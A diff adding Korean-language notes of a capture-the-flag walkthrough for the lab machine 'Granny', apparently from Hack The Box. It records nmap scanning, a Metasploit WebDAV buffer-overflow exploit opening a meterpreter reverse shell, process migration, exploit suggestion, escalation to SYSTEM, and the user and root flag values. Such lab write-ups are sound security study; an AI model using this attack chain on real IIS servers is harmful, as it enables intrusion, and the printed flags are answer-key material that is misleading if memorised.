@@ -1,0 +1,85 @@
+Machine: Granny
+TARGET: 10.129.95.234
+
+nmap -sV -sC -oA nmap/Granny $ip    
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-methods: 
+|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
+|_http-title: Under Construction
+| http-webdav-scan: 
+|   Server Type: Microsoft-IIS/6.0
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|   Server Date: Sat, 02 Aug 2025 13:26:22 GMT
+|_  WebDAV type: Unknown
+|_http-server-header: Microsoft-IIS/6.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+80번 단일포트 열려있음 Microsoft-IIS 6.0 사용중 
+
+Microsoft-IIS 6.0 취약점 탐색 중 
+
+https://www.exploit-db.com/exploits/41992
+
+Overflow 취약점 발견 
+
+msfconsole 
+
+search ScStoragePathFromUrl
+use 0
+set RHOSTS 10.129.95.234
+set LHOST 10.10.14.72
+
+run
+
+meterpreter 셸 획득
+
+getuid
+[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
+getuid가 권한낮음 으로 실패 아마 웹서비스 권한인것 같음
+다른권한의 프로세스 전환해서 권한상승 시도
+
+ps
+1956  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
+migrate 1956
+getuid
+Server username: NT AUTHORITY\NETWORK SERVICE
+권한상승 성공
+
+하지만 아직 접근 제한된게 많음 다시 권한 상승을 위해서 
+ctrl + Z 세션 백그라운드로 보내고 metasploit 권한상승취약점 탐색모듈 사용
+use post/multi/recon/local_exploit_suggester   
+
+set SESSION 1
+run
+
+
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
+ 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
+ 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
+ 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+ 7   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
+
+
+use exploit/windows/local/ms15_051_client_copy_image 
+
+set SESSION 1
+set LHOST 10.10.14.72
+run 
+getuid
+Server username: NT AUTHORITY\SYSTEM
+
+시스템 권한 획득
+
+cat user.txt 
+700c5dc163014e22b3e408f8703f67d1
+
+cat root.txt 
+aa4beed1c0584445ab463a6747bd06e9
+
+
